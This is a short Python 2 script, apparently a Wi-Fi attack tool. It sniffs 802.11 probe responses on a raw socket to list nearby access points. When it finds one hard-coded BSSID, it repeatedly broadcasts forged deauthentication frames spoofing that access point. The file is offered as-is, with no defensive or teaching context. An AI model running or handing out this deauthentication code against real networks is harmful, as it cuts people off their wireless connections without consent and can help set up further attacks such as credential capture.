from socket import *
import struct
import binascii

activeAps = []
IFACE=""
PROBE_RESPONSE=80
sniff = socket(AF_PACKET, SOCK_RAW, 3)
sniff.bind((IFACE, 0x0003))
activeSniff = True
while 1:
    while activeSniff:
        fm = sniff.recv(2000)[38:]
        #print ':'.join(x.encode('hex') for x in fm)
        type,ordr=struct.unpack("!BB", fm[:2])
        if type == PROBE_RESPONSE:
            dur,dMac,sMac,bssidMac = struct.unpack("!H6s6s6s", fm[2:22])
            bssidMac = binascii.hexlify(bssidMac)
            questioner = binascii.hexlify(dMac)
            if bssidMac not in activeAps:
                activeAps.append(bssidMac)
                print "=============================================\n" \
                      "SSID: %s\nBSSID mac: %s\nQuestioner mac: %s" % (fm[38:47], bssidMac, questioner)
            if bssidMac == '3613e8404be2':
                activeSniff = False

    else:
        pld = '00000c000480000002001800c0003a01ffffffffffff' + bssidMac + bssidMac + '00000700'
        dtP = pld.decode('hex')
        i=0
        while i<20:
            sniff.send(dtP)
            i+=1
        print '%d packets sent'%(i)
        activeSniff = True
